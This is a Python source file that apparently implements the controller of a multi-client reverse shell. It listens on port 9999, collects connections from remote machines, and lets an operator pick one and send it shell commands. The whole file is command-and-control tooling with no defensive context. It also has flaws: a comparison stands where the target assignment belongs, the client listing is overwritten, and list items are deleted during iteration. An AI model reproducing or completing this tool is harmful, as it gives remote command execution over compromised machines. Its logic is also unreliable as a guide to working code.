import socket
import sys
import threading
import time 
from queue import Queue

NUMBER_OF_THREAD = 2 
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []

def create_socket():
    try:

        global host 
        global port 
        global s 
        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as msg :
        print (str(msg))

def bnd_socket():
    try:

        global host 
        global port 
        global s 
        print ('binding port ' + str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print (str(msg))
        print('Retrying... ') 
        bnd_socket()

# def socket_accept ():
#     conversation, address = s.accept()
#     print ('connection established ') 
#     print ('Ip: ' , address[0] )
#     print ('Port',address[1] )
#     send_command(conversation)
#     conversation.close()


# def send_command (con):
#     while True:
#         cmd = input()
#         if cmd == 'q':
#             con.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(cmd)) != 0 :
#             con.send(str.encode(cmd))
#             client_response = str(con.recv(1024),'utf-8')
#             print(client_response,end = '')


# create_socket()
# bnd_socket()
# socket_accept()


def accept_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True: 
        try:

            conn,address = s.accept()
            s.setblocking(1) # prevent time out 
            all_connections.append(conn)
            all_addresses.append(address)
            print ('Connection estabslished ...',address[0])
        except :
            print ('Error')

def start_shell():
    
    while True :
        cmd = input('shell >')
        if cmd == 'list':
            list_connections()  
        elif 'select' in cmd :
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else: 
            print('Invalid command ')

def list_connections() :
    results =''
    
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('  '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results  = str(i) + '   ' + str(all_addresses[i][0]) + '  '+ str(all_addresses[i][1]) + '\n'
    print ('Clients','\n',results)   

def get_target(cmd ):
    try : 
        target = cmd.replace('select ','')
        target = int(target)
        conn == all_connections[target]
        print('Connection established ... ',str(all_addresses[target][0]))
        print (str(all_addresses[target][0]),'>',end = '')
        
        return conn
    except:
        print ('Selcection is not vaild')
    

def send_target_command(con):

    while True:
        try: 
            cmd = input()
            if cmd == 'q':
                break 
            if len(str.encode(cmd)) != 0 :
                con.send(str.encode(cmd))
                client_response = str(con.recv(20480),'utf-8')
                print(client_response,end = '')
        except:
            print ('Error')
            break 

def create_worker ():

    for _ in range (NUMBER_OF_THREAD ):
        t = threading.Thread(target= work)
        t.daemon = True 
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1 :
            create_socket()
            bnd_socket()
            accept_connections()
        if x == 2 :
            start_shell()

        queue.task_done()   


def creat_jobs ():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_worker()
creat_jobs()